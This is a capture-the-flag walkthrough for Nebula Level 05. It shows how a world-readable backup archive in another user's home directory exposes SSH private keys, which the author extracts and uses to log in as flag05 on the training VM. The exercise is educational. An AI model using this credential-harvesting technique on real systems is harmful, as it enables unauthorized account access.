# Nebula - Level 05

### About ###

>Check the flag05 home directory. You are looking for weak directory permissions
>
>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

### Solution ###

```
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 Aug 18  2012 .
drwxr-xr-x 1 root   root     340 Aug 27  2012 ..
drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .backup
-rw-r--r-- 1 flag05 flag05   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 May 18  2011 .bashrc
-rw-r--r-- 1 flag05 flag05   675 May 18  2011 .profile
drwx------ 2 flag05 flag05    70 Nov 20  2011 .ssh
```

An interesting directory, `.backup` can be found in the home directory of the user flag05

```
level05@nebula:/home/flag05$ ls -la .backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .
drwxr-x--- 4 flag05 level05   93 Aug 18  2012 ..
-rw-rw-r-- 1 flag05 flag05  1826 Nov 20  2011 backup-19072011.tgz
```

`.backup` contains an archive that can be decompressed.

```
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp
level05@nebula:/home/flag05/.backup$ cd /tmp/
level05@nebula:/tmp$ tar xzvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

The archive contains ssh keys. By copying them to `level05`’s home directory, it is possible to connect to the account `flag05` with `ssh` and execute `getflag` successfully.
￼

```
level05@nebula:/tmp$ cp -r .ssh/ ~/
level05@nebula:/tmp$ ssh flag05@localhost

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


flag05@nebula:~$
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```